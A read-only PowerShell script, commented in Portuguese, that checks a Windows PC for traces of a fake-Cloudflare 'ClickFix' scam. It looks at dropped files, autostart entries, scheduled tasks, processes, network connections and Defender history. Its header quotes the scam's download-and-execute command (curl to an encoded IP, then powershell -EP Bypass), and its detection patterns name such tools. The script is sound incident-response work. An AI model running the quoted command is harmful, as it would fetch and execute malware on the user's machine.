# Verificacao de seguranca apos o golpe "falso Cloudflare" (ClickFix) - SOMENTE LEITURA, nao altera nada.
# Comando do golpe: curl http://392073715/12997 (= 23.94.145.243) -> %TEMP%\P405.ps1 -> powershell -EP Bypass
# Rodar como o usuario comum (o mesmo que abriu a pagina).
$corte  = (Get-Date).Date.AddHours(15).AddMinutes(30)   # hoje 15:30
$saida  = Join-Path $PSScriptRoot ("seguranca_" + $env:COMPUTERNAME + "_" + (Get-Date -Format "yyyyMMdd_HHmmss") + ".txt")
$alertas = New-Object System.Collections.ArrayList
$extRisco = '\.(ps1|exe|dll|msi|zip|rar|7z|js|jse|vbs|vbe|bat|cmd|hta|lnk|scr|cpl)$'

function Log($t) { $t | Out-File $saida -Append -Encoding utf8 }
function Bloco($titulo, $script) {
    Log "`r`n===== $titulo ====="
    try { & $script 2>&1 | Out-String -Width 300 | ForEach-Object { Log $_ } } catch { Log "ERRO: $_" }
}
function Alerta($t) { [void]$alertas.Add($t) }

Log "Verificacao em $(Get-Date)  usuario $env:USERNAME  maquina $env:COMPUTERNAME  corte: arquivos/tarefas desde $corte"

Bloco "1. ARQUIVO DO GOLPE (P405.ps1)" {
    $p = Join-Path $env:TEMP "P405.ps1"
    if (Test-Path $p) { Alerta "P405.ps1 EXISTE em $env:TEMP (o download aconteceu)"; "EXISTE: $p"; Get-Item $p | Select-Object Length, CreationTime } else { "nao existe (download nao aconteceu)" }
}

Bloco "2. ARQUIVOS DE RISCO CRIADOS/ALTERADOS DESDE O CORTE" {
    $pastas = @($env:TEMP, "$env:USERPROFILE\Downloads", $env:APPDATA, $env:LOCALAPPDATA, "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup", $env:PUBLIC, "C:\ProgramData")
    foreach ($d in $pastas) {
        if (-not (Test-Path $d)) { continue }
        $achados = @()
        try {
            $achados = Get-ChildItem $d -Recurse -File -Force -ErrorAction SilentlyContinue |
                Where-Object { ($_.CreationTime -ge $corte -or $_.LastWriteTime -ge $corte) -and $_.Name -match $extRisco -and $_.FullName -notmatch 'kit-zebra|kit_zebra|SUPORTE_ZEBRA|\\Temp\\claude\\|\\Google\\Chrome\\User Data\\.*\\(Code Cache|Cache)|\\Microsoft\\Edge\\User Data\\.*\\(Code Cache|Cache)' }
        } catch { "aviso: varredura parcial em $d ($_)" }
        foreach ($a in $achados) {
            "{0}  {1,10}  {2}" -f $a.LastWriteTime, $a.Length, $a.FullName
            if ($a.Name -match '\.(ps1|exe|dll|msi|js|jse|vbs|vbe|hta|scr|cpl)$') { Alerta "arquivo novo de risco: $($a.FullName)" }
        }
    }
}

Bloco "3. INICIALIZACAO AUTOMATICA (registro HKCU Run / RunOnce)" {
    foreach ($k in 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run', 'HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce') {
        "--- $k"
        $v = Get-ItemProperty $k -ErrorAction SilentlyContinue
        if ($v) {
            $v.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
                "{0} = {1}" -f $_.Name, $_.Value
                if ("$($_.Value)" -match 'powershell|mshta|curl|wscript|cscript|rundll32|regsvr32|\\Temp\\|AppData\\Roaming\\[^\\]+\.(exe|ps1|js|vbs)') { Alerta "inicializacao suspeita: $($_.Name) = $($_.Value)" }
            }
        }
    }
}

Bloco "4. PASTA INICIALIZAR (Startup)" {
    Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup" -Force -ErrorAction SilentlyContinue | ForEach-Object {
        "{0}  {1}" -f $_.LastWriteTime, $_.Name
        if ($_.LastWriteTime -ge $corte -and $_.Name -ne 'desktop.ini') { Alerta "item novo na pasta Inicializar: $($_.Name)" }
    }
}

Bloco "5. TAREFAS AGENDADAS CRIADAS HOJE" {
    Get-ScheduledTask -ErrorAction SilentlyContinue | ForEach-Object {
        $data = $null; try { $data = [datetime]$_.Date } catch {}
        $acao = ($_.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments)" }) -join ' | '
        if (($data -and $data -ge $corte) -or $acao -match '-enc|-e [A-Za-z0-9+/=]{20}|mshta|curl|https?://|\\AppData\\Local\\Temp\\|P405') {
            "{0}  {1}{2}  ->  {3}" -f $data, $_.TaskPath, $_.TaskName, $acao
            Alerta "tarefa agendada suspeita: $($_.TaskPath)$($_.TaskName) -> $acao"
        }
    }
    "(fim - so aparecem tarefas novas ou com acao suspeita)"
}

Bloco "6. PROCESSOS SUSPEITOS RODANDO AGORA" {
    Get-CimInstance Win32_Process | Where-Object { $_.Name -match '^(powershell|pwsh|mshta|wscript|cscript|curl|rundll32|regsvr32|bitsadmin|certutil)\.exe$' } | ForEach-Object {
        "PID {0}  {1}  inicio {2}  {3}" -f $_.ProcessId, $_.Name, $_.CreationDate, $_.CommandLine
        $suspeito = ($_.CommandLine -match '392073715|23\.94\.145\.243|P405|-enc|https?://|\\AppData\\Local\\Temp\\[^\\]+\.ps1') -or ($_.Name -match '^(mshta|curl|bitsadmin|certutil)\.exe$')
        if ($suspeito -and $_.CommandLine -notmatch 'seguranca\.ps1|diagnostico\.ps1|diag_\*\.txt|\\Temp\\claude\\') { Alerta "processo suspeito rodando: PID $($_.ProcessId) $($_.Name) $($_.CommandLine)" }
    }
    "(fim)"
}

Bloco "7. CONEXOES COM O SERVIDOR DO GOLPE (23.94.145.243)" {
    $c = netstat -ano | Select-String '23\.94\.145\.243'
    if ($c) { $c; Alerta "conexao ativa com 23.94.145.243" } else { "nenhuma conexao com 23.94.145.243" }
}

Bloco "8. HISTORICO DO POWERSHELL DO USUARIO (ultimas 30 linhas)" {
    $h = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $h) {
        Get-Content $h -Tail 30
        if (Select-String -Path $h -Pattern '392073715|23\.94\.145\.243|P405' -Quiet) { Alerta "historico do PowerShell cita o golpe" }
    } else { "sem historico" }
}

Bloco "9. ANTIVIRUS (Windows Defender)" {
    try { Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated, QuickScanEndTime | Format-List } catch { "Get-MpComputerStatus indisponivel: $_" }
    try {
        $d = Get-MpThreatDetection -ErrorAction Stop | Where-Object { $_.InitialDetectionTime -ge $corte.Date }
        if ($d) { $d | Select-Object InitialDetectionTime, ThreatID, Resources, ActionSuccess | Format-List; Alerta "o Defender detectou ameaca hoje (ver bloco 9)" } else { "nenhuma deteccao hoje" }
    } catch { "historico de deteccoes exige admin - conferir na tela: Seguranca do Windows > Protecao contra virus > Historico de protecao" }
}

# resumo na tela e no arquivo
Log "`r`n===== RESUMO ====="
Write-Host ""
if ($alertas.Count -eq 0) {
    Log "NENHUM ALERTA - nao ha sinal de que o golpe rodou."
    Write-Host "NENHUM ALERTA - nao ha sinal de que o golpe rodou." -ForegroundColor Green
} else {
    Log "$($alertas.Count) ALERTA(S):"; $alertas | ForEach-Object { Log " - $_" }
    Write-Host "$($alertas.Count) ALERTA(S):" -ForegroundColor Red
    $alertas | ForEach-Object { Write-Host " - $_" -ForegroundColor Red }
}
Write-Host ""
Write-Host "Relatorio completo em:" -ForegroundColor Yellow
Write-Host $saida
